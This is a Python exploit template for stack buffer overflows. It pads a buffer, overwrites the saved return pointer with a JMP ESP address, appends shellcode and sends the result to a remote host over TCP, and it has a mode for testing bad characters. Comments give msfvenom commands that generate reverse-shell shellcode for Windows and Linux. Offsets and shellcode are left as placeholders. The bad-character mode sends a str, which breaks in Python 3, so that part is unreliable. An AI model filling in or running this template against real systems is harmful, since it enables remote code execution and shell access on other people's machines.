#!/usr/bin/env python3

import socket
import struct
import argparse

# Colors
BOLD = '\033[1m'
ENDC = '\033[0m'



# Config
RHOST = "127.0.0.1"  # CHANGE ME
RPORT = 1234   # CHANGE ME



#==
# Print's the exploit banner
#==
def banner():
    bannerSign = "="
    bannerWidth = 80
    author = "Thomas Schwarz aka qwertty"
    date = "2021/03/21"
    print(BOLD + bannerSign * bannerWidth + ENDC)
    print(BOLD + " AUTHOR: " + ENDC + author)
    print(BOLD + " DATE: " + ENDC + date)
    print(BOLD + " VENDOR HOMEPAGE: " + ENDC )
    print(BOLD + " SOFTWARE LINK: " + ENDC )
    print(BOLD + " VERSION: " + ENDC)
    print(BOLD + bannerSign * bannerWidth + ENDC)



#==
# Generate list of all charactes 
# to test if they are bad characters
#==
def generate_badchars():
    badchars = ""
    known_badchars = [0x00, 0x0A]

    for i in range(0x00, 0xFF+1):
        if i not in known_badchars:
            badchars += chr(i)

    return badchars



def generate_payload():
    # Arbitrary shellcode
    #
    # msfvenom for shellcode generation
    # WINDOWS:
    #   msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> 
    #       -f python --var-name shellcode EXITFUNC=thread -b '\x00\x0A'
    #
    # LINUX:
    #   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> 
    #       -f python --var-name shellcode EXITFUNC=thread -b '\x00\x0A'
    shellcode =  b""

    buffer_length = 1024
    offset_srp = 0                  # CHANGE ME | SRP = Saved Returned Pointer
    jmp_esp_pointer = 0x00          # CHANGE ME
    sub_esp = b"\x00\x00\x00"       # CHANGE ME

    # Build payload
    payload = b""
    payload += b"A" * (offset_srp - len(payload))    # Padding
    payload += struct.pack("<I", jmp_esp_pointer)    # SRP overwrite
    payload += sub_esp                               # ESP should end up pointing here
    payload += shellcode 
    payload += b"D" * (buffer_length - len(payload)) # Trailing padding
    payload += b"\n"

    return payload



#==
# Send's the exploit to the remoote host
#==
def exploit(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    s.send(payload)



#==
# Run all functions
#==
banner()

# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-b", "--badchars",
    default=False, nargs="?", const=True,
    help="Send a list of chars to determine all bad characters")
args = parser.parse_args()

print("Start generating payload ...")
payload = ""
if args.badchars == True:
    payload = generate_badchars()
    print("Bad character list generated")
else:
    payload = generate_payload()
    print("Payload generated")

print("Sending payload...")
exploit(payload)
print("Payload send! Check your result")
